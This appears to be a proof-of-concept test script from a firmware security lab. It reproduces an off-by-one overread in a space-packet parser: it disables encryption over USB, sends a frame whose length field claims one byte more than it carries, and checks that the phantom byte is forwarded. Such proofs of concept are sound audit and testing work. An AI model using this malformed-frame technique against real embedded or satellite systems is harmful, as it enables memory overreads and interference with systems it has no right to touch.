#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

# Largest inner frame the bench radio-inject channel can carry on silicon:
# the LAB_CTRL outer SPP data field caps at 200 bytes, minus the 7-byte lab
# control header => 193 bytes.
N_WIRE = 180          # data bytes actually present on the wire


def main(dev, ev):
    # V0-16: spp_unpack_packet memcpy()s length+1 bytes but never checks
    # the received buffer_len against it. A frame declaring one more data
    # byte than is on the wire makes the parser read (and forward) a byte
    # that is not part of the frame.
    dev.tc(0x0A, b"\x00", via="usb", encrypt=False)     # crypto off: cleartext BROADCAST

    # first two data bytes are the downlink frequency (whitelisted 916)
    data_on_wire = struct.pack(">H", 916) + b"A" * (N_WIRE - 2)
    short_frame = struct.pack(">HHH", 0x0006, 1 << 14, N_WIRE) + data_on_wire
    # ...but the length field is one optimistic: firmware copies N_WIRE+1.
    unp = fs.spp_unpack(short_frame)
    ev.log(f"declared data bytes = {N_WIRE + 1}, bytes on wire = {len(data_on_wire)}")
    ev.log(f"parser returns {unp['len']} bytes, last byte = 0x{unp['data'][-1]:02X} "
           f"(read past the frame)")
    check(unp["len"] == N_WIRE + 1 and unp["data"][-1] == 0xFF,
          "unpack must reproduce the off-by-one overread")

    tms = dev._decode_all(dev._xfer(short_frame, "radio"))
    if not dev.hw:
        # the simulator's wire also carries the telemetry back to the bench
        b = dev.find(tms, 0x06)[0]
        ev.log(f"device echoed msg of {len(b.payload)} B, tail = {b.payload[-6:].hex()}")
        check(len(b.payload) == N_WIRE - 1 and b.payload[-1] == 0xFF,
              "forwarded echo proves the phantom byte")

    # hardware proof: the payload service records the forwarded length --
    # one byte more than the frame carried (the radio-only broadcast TM
    # itself never returns over the bench USB wire)
    st = dev.tc(0x0F, b"", via="usb")
    p = dev.find(st, 0x0F)[0]
    fwd = p.u8(8)
    ev.log(f"payload service forwarded {fwd} B (frame had {N_WIRE - 2} B of msg)")
    check(fwd == N_WIRE - 1, "forwarded length proves the phantom byte")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-16 SPP unpack off-by-one / overread", main))
